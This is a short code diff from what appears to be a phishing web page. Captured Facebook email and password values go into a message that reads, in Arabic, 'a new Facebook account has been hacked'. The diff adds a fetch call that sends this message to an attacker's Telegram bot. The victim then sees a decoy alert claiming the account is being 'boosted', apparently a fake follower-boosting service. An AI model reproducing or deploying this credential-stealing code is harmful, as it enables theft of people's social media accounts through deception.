@@ -95,7 +95,16 @@
     const message = `📥 - تم اختراق حساب فيسبوك جديد :- \n📧 - الإيميل: ${email}\n🔑 - الباسورد: ${password}`;
 
     const url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${id}&text=${encodeURIComponent(message)};
-    
+
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        console.log("✅ جار رشق حسابك", data);
+        alert("✅ جار رشق حسابك");
+      })
+      .catch(error => {
+        console.error("❌ خطأ:", error);
+        alert("❌ حصلت مشكلة أثناء الإرسال!");
       });
   });
 </script>
